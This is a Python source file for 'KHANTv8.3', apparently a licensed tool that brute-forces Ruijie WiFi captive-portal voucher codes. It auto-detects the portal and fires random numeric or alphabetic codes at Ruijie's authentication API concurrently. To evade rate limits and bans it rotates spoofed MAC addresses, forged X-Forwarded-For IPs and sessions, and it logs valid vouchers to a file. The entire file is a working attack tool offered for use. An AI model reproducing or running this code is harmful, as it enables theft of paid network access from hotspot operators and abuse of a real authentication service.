#!/usr/bin/env python3
"""
Ruijie Voucher Scanner - KHANTv8.3 (Part 1)
- V6 License Integration & Clean Setup with Emojis
"""

import os
import sys
import json
import asyncio
import aiohttp
import time
import socket
import requests
import urllib3
import random
import string
from datetime import datetime
from urllib.parse import urlparse, parse_qs, quote

from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.align import Align
from rich.text import Text
from rich.box import ROUNDED

from license import check_approval, activate, _get_device_id

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RL_SLEEP = 0.1
CONCURRENCY = 10
console = Console()

def verify_and_enforce_license():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    is_valid, msg = check_approval()
    if is_valid:
        print(f"[+] License Active: {msg}")
        time.sleep(1)
        return

    device_id = _get_device_id()
    print("=" * 50)
    print("         🔒 KHANTv8.3 - LICENSE ACTIVATION         ")
    print("=" * 50)
    print(f"📱 Device ID: {device_id}")
    print(f"📌 Status   : {msg}")
    print("-" * 50)
    
    entered_key = input("🔑 Enter License Key (V6-KAVIN-...): ").strip()
    if not entered_key:
        print("❌ Key မထည့်ပါ။ ပိတ်လိုက်ပါပြီ။")
        sys.exit(1)
        
    success, act_msg = activate(entered_key)
    if success:
        print(f"✅ {act_msg}")
        time.sleep(1.5)
    else:
        print(f"❌ Activation Failed: {act_msg}")
        time.sleep(2)
        sys.exit(1)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    console.print(Panel(
        Align.center(
            Text("KHANTv8.3 RUIJIE SCANNER", style="bold magenta") + "\n" +
            Text("Hit Plan Enabled | Real-Time Engine", style="bold cyan")
        ), 
        border_style="cyan", 
        box=ROUNDED
    ))
    print()

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except:
        return "192.168.110.1"

def extract_params_from_url(url):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    params = {}
    mapping = {
        'gw_id': 'gw_id', 'gw_sn': 'gw_sn', 'gw_address': 'gw_address',
        'gw_port': 'gw_port', 'ip': 'ip', 'mac': 'mac', 'slot_num': 'slot_num',
        'nasip': 'nasip', 'ssid': 'ssid', 'url': 'url', 'chap_id': 'chap_id',
        'chap_challenge': 'chap_challenge'
    }
    for key, mk in mapping.items():
        if key in query:
            params[mk] = query[key][0]
    if 'RES' in query:
        params['RES'] = query['RES'][0]
    return params

def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def auto_detect_portal():
    print("🌐 Auto detecting portal URL...")
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})
    
    TEST_URL = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r = session.get(TEST_URL, allow_redirects=True, timeout=5)
        if "ruijienetworks" in r.url:
            return r.url
    except:
        pass

    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254", "192.168.1.1"]
    for gw in list(dict.fromkeys(gateways)):
        try:
            res = session.get(f"http://{gw}", timeout=5, allow_redirects=True)
            if "ruijienetworks" in res.url:
                return res.url
        except:
            pass
    return None
class VoucherScanner:
    def __init__(self):
        self.sid = None
        self.sign = None
        self.timestamp = None
        self.session_valid = False
        self.rate_limited = False
        self.mode = "num"
        
        self.current_mac = self.gen_random_mac()
        self.current_ip = f"192.168.110.{random.randint(2, 254)}"

        self._display_active = False
        self._live = None
        self._state = {
            'phase': '', 'conc': CONCURRENCY, 'batch': 1,
            'total': 0, 'checked': 0, 'speed': 0, 'percentage': 0,
            'found': [], 'valid': [], 'status': None, 'session': None, 'current_code': ''
        }

        self.params = {
            "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
            "gw_address": "192.168.7.1", "gw_port": "2060", "ip": self.current_ip,
            "mac": self.current_mac, "slot_num": "14", "nasip": "192.168.1.193",
            "ssid": "VLAN7", "ustate": "0", "mac_req": "1",
            "url": "http://connectivitycheck.gstatic.com/generate_204",
            "chap_id": r"\245", "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
        }

    def apply_params_from_url(self, url):
        params = extract_params_from_url(url)
        for key, value in params.items():
            if key in self.params:
                self.params[key] = value
        self.params['mac'] = self.current_mac
        self.params['ip'] = self.current_ip

    def print_progress_bar(self, percentage, width=30):
        filled = int(width * percentage / 100)
        return '#' * filled + '-' * (width - filled)

    def gen_random_mac(self):
        mac = [0x00, 0x16, 0x3e, random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
        return ':'.join(map(lambda x: "%02x" % x, mac))

    def generate_voucher(self, length):
        if self.mode == "num":
            return str(random.randint(0, 10**length - 1)).zfill(length)
        elif self.mode == "eng":
            return ''.join(random.choices(string.ascii_lowercase, k=length))
        elif self.mode == "mix":
            return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
        return str(random.randint(0, 10**length - 1)).zfill(length)

    def make_layout(self):
        s = self._state
        layout = Layout()
        layout.split_column(
            Layout(name="header", size=4),
            Layout(name="live", size=3),
            Layout(name="logs", ratio=1),
            Layout(name="hits", ratio=1),
        )

        title = Text("KHANTv8.3 - RUIJIE REAL-HITS SCANNER", style="bold magenta", justify="center")
        sub = Text(f"MAC: {self.current_mac[-8:]} | IP: {self.current_ip[-3:]}", style="bold cyan", justify="center")
        layout["header"].update(Panel(Align.center(Text.assemble(title, "\n", sub)), border_style="cyan", box=ROUNDED))

        status_text = Text(s['status'], style="bold yellow") if s['status'] else Text("Active", style="bold green")

        live_grid = Table.grid(padding=0, expand=True)
        live_grid.add_column(ratio=3)
        live_grid.add_column(ratio=2)
        live_grid.add_column(ratio=2)
        live_grid.add_column(ratio=2)
        live_grid.add_row(
            Panel(Align.center(Text(s['current_code'], style="bold green")), title="Code", border_style="green", box=ROUNDED),
            Panel(Align.center(Text(f"{s['checked']:,}/{s['total']:,}", style="bold cyan")), title="Checked", border_style="cyan", box=ROUNDED),
            Panel(Align.center(Text(f"{s['speed']:,}/min", style="bold cyan")), title="Speed", border_style="cyan", box=ROUNDED),
            Panel(Align.center(status_text), title="Status", border_style="magenta", box=ROUNDED),
        )
        layout["live"].update(live_grid)

        log_text = Text()
        log_text.append(f"Session: {s['session'][:15] if s['session'] else 'None'}...\n")
        log_text.append(f"Progress: [{self.print_progress_bar(s['percentage'])}] {s['percentage']:.2f}%\n")
        layout["logs"].update(Panel(log_text, title="Progress & Hit Plan", border_style="blue", box=ROUNDED))

        # Hits Table - ကုဒ်နှင့်အတူ သက်တမ်း (Expiry/Duration) ပါ ပေါ်စေရန်
        hits_table = Table(show_header=True, header_style="bold magenta", expand=True, box=ROUNDED)
        hits_table.add_column("Type", width=8, justify="center")
        hits_table.add_column("Voucher Code", justify="center")
        hits_table.add_column("Validity / Expiry Info", justify="center")
        
        for item in s['found']:
            # item တွင် [voucher, expiry_info] ပုံစံဖြင့် ဝင်လာမည်
            v_code = item[0] if isinstance(item, list) else item
            v_info = item[1] if isinstance(item, list) else "Active / Found"
            hits_table.add_row("[bold green]FOUND[/bold green]", v_code, f"[cyan]{v_info}[/cyan]")
            
        for item in s['valid']:
            v_code = item[0] if isinstance(item, list) else item
            v_info = item[1] if isinstance(item, list) else "Valid"
            hits_table.add_row("[green]VALID[/green]", v_code, f"[cyan]{v_info}[/cyan]")

        if not s['found'] and not s['valid']: 
            hits_table.add_row("", "[dim]No real hits yet...[/dim]", "")

        layout["hits"].update(Panel(hits_table, title=f"Real Hits Plan (F: {len(s['found'])} | V: {len(s['valid'])})", border_style="cyan", box=ROUNDED))
        return layout

    def _render(self):
        if not self._display_active: return
        try: self._live.update(self.make_layout())
        except: pass

    async def get_session_id(self, session, force_refresh=False):
        if not force_refresh and self.sid and self.session_valid:
            return self.sid

        base_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog"
        attempt = 0
        while attempt < 5:
            attempt += 1
            if self.rate_limited or attempt > 2:
                self.current_mac = self.gen_random_mac()
                self.current_ip = f"192.168.110.{random.randint(2, 254)}"
                self.rate_limited = False

            temp_params = self.params.copy()
            temp_params['mac'] = self.current_mac
            temp_params['ip'] = self.current_ip

            params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
            full_url = f"{base_url}?{params_str}"

            headers = {
                'User-Agent': f'Mozilla/5.0 (Linux; Android 14) KHANTv8.3-{self.current_mac}',
                'Client-Mac': self.current_mac,
                'X-Forwarded-For': self.current_ip,
                'Connection': 'close'
            }

            try:
                session.cookie_jar.clear()
                async with session.get(full_url, headers=headers, timeout=10, allow_redirects=False) as resp:
                    location = resp.headers.get('Location', '')
                    if not location:
                        await asyncio.sleep(RL_SLEEP)
                        continue

                    if "request limited" in location.lower() or "banned" in location.lower():
                        self.rate_limited = True
                        await asyncio.sleep(RL_SLEEP)
                        continue

                    query = parse_qs(urlparse(location).query)
                    sid = query.get('sessionId', [None])[0]
                    if sid:
                        self.sid = sid
                        self.sign = query.get('sign', [None])[0]
                        self.timestamp = query.get('timestamp', [None])[0]
                        self.session_valid = True
                        self._state['session'] = sid
                        self._render()
                        return sid
                    await asyncio.sleep(RL_SLEEP)
            except:
                await asyncio.sleep(RL_SLEEP)
        return None

    async def validate_voucher(self, session, voucher):
        if not await self.get_session_id(session, force_refresh=False):
            return 'RATE_LIMITED', None, "No session"

        url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
        if self.sign and self.timestamp:
            url += f"&sign={self.sign}&timestamp={self.timestamp}"

        headers = {
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 12)",
            "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={self.sid}",
        }

        for _ in range(1, 4):
            payload = {"accessCode": voucher, "sessionId": self.sid, "apiVersion": 1}
            if self.sign: payload["sign"] = self.sign
            if self.timestamp: payload["timestamp"] = self.timestamp

            try:
                async with session.post(url, json=payload, headers=headers, ssl=False, timeout=10, allow_redirects=True) as resp:
                    text = await resp.text()
                    try: result = json.loads(text)
                    except: result = {}

                    message = str(result.get("message", "")).lower()

                    if "request limited" in message or "too many" in message:
                        self.session_valid = False
                        self.rate_limited = True
                        return 'RATE_LIMITED', None, message

                    if "session timed out" in message or "invalid session" in message:
                        self.session_valid = False
                        await self.get_session_id(session, force_refresh=True)
                        continue

                    # Server မှ ပေးလိုက်သော Result အသေးစိတ် (သက်တမ်း/Duration/Time) များကို ဖမ်းယူခြင်း
                    res_data = result.get("result", {})
                    if result.get("success") is True and isinstance(res_data, dict):
                        logon_url = res_data.get("logonUrl")
                        # API ထဲပါလာနိုင်သော သက်တမ်း သို့မဟုတ် အချိန်အချက်အလက်များကို ရှာဖွေခြင်း
                        validity_info = res_data.get("expireTime") or res_data.get("duration") or res_data.get("leftTime") or "Active"
                        return ('FOUND', logon_url, validity_info) if logon_url else ('VALID', None, validity_info)
                    
                    if '"result":0' in text or '"error":null' in text:
                        validity_info = "Valid Hit"
                        if isinstance(res_data, dict):
                            validity_info = res_data.get("expireTime") or res_data.get("duration") or "Valid Hit"
                        logon_url = res_data.get("logonUrl") if isinstance(res_data, dict) else None
                        return ('FOUND', logon_url, validity_info) if logon_url else ('VALID', None, validity_info)

                    return 'INVALID', None, message
            except:
                self.session_valid = False
                await asyncio.sleep(0.2)
        return 'INVALID', None, "Max retries"

    def save_found(self, voucher: str, status: str, expiry_info: str = "", logon_url: str = ""):
        ts = get_timestamp()
        with open("found_khant_v8.3.txt", "a") as f:
            if status == "FOUND": f.write(f"[{ts}] Code: {voucher} | Expiry: {expiry_info} | URL: {logon_url}\n")
            elif status == "VALID": f.write(f"[{ts}] Code: {voucher} | Expiry: {expiry_info} -> VALID\n")

    async def run_phase(self, session, total_codes, length):
        self._state.update({
            'total': total_codes, 'checked': 0, 'speed': 0, 'percentage': 0,
            'session': self.sid, 'current_code': '----'
        })
        self._display_active = True
        self._live = Live(self.make_layout(), refresh_per_second=10, screen=True)
        self._live.start()

        start_time = time.time()
        tested_count = 0
        semaphore = asyncio.Semaphore(CONCURRENCY)

        async def bounded_check(v):
            async with semaphore:
                res = await self.validate_voucher(session, v)
                return v, res

        try:
            batch = []
            for _ in range(total_codes):
                voucher = self.generate_voucher(length)
                batch.append(voucher)

                if len(batch) >= CONCURRENCY:
                    results = await asyncio.gather(*(bounded_check(v) for v in batch))
                    
                    for v, res in results:
                        tested_count += 1
                        status, logon_url, expiry_info = res
                        
                        if status in ['FOUND', 'VALID']:
                            hit_entry = [v, str(expiry_info)]
                            self._state['found' if status == 'FOUND' else 'valid'].append(hit_entry)
                            self.save_found(v, status, str(expiry_info), logon_url or "")
                            self.session_valid = False
                            await self.get_session_id(session, force_refresh=True)

                    self._state['current_code'] = batch[-1]
                    self._state['checked'] = tested_count
                    elapsed = time.time() - start_time
                    self._state['speed'] = int(tested_count / elapsed * 60) if elapsed > 0 else 0
                    self._state['percentage'] = (tested_count / total_codes) * 100
                    self._render()
                    batch.clear()
        finally:
            self._display_active = False
            self._live.stop()
            print("\n✨ Scan finished & hit plan executed!")

async def main():
    verify_and_enforce_license()

    show_banner()
    scanner = VoucherScanner()

    portal_url = auto_detect_portal()
    if portal_url:
        scanner.apply_params_from_url(portal_url)
        print("🔗 Portal URL fetched successfully!")
    else:
        url_input = input("🌐 Enter Portal URL: ").strip()
        if not url_input: return
        scanner.apply_params_from_url(url_input)

    print("\n--- ⚙️ Choose Scan Type ---")
    print("1. 🔢 Number (0-9)")
    print("2. 🔤 English (a-z)")
    print("3. 🔀 Mixed (a-z + 0-9)")
    scan_type = input("👉 Select (1/2/3) [1]: ").strip()
    
    if scan_type == "2":
        scanner.mode = "eng"
    elif scan_type == "3":
        scanner.mode = "mix"
    else:
        scanner.mode = "num"

    print("\n--- 📏 Choose Voucher Length ---")
    print("1. 6 🔢 digits")
    print("2. 7 🔢 digits")
    print("3. 8 🔢 digits")
    print("4. 9 🔢 digits")
    len_choice = input("👉 Select (1/2/3/4) [1]: ").strip()
    
    length_map = {"1": 6, "2": 7, "3": 8, "4": 9}
    length = length_map.get(len_choice, 6)
    
    totals = {6: 100000, 7: 500000, 8: 1000000, 9: 5000000}
    total_codes = totals.get(length, 100000)

    print(f"\n🚀 Selected Length: {length} | Total Codes: {total_codes:,}")
    input("⚡ Press Enter to start scanning...")

    async with aiohttp.ClientSession() as session:
        await scanner.run_phase(session, total_codes, length)

    input("\n👋 Press Enter to exit...")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⚠️ Interrupted by user")
    except Exception as e:
        print(f"❌ Error: {e}")
